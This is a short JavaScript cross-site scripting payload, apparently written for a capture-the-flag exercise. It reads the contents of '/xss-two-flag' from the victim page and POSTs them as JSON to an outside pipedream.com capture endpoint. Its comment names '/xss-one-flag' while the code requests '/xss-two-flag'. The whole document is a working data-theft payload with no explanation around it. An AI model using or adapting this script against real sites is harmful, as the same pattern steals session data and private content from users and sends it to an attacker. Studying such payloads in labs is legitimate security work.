<script>
// Send a request to fetch /xss-one-flag and send it to your server
var xhr = new XMLHttpRequest();
xhr.open('GET', '/xss-two-flag', true);
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        var stolenFlag = xhr.responseText;
        
        // Send the stolen flag to your server
        fetch('https://pipedream.com/@grish8833/projects/proj_XZsoLvx/p_pWCJ97b/inspect/2fzjZyEbinC4IIYsDNFz8wcMHZp', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                flag: stolenFlag
            })
        });
    }
};
xhr.send();
</script>
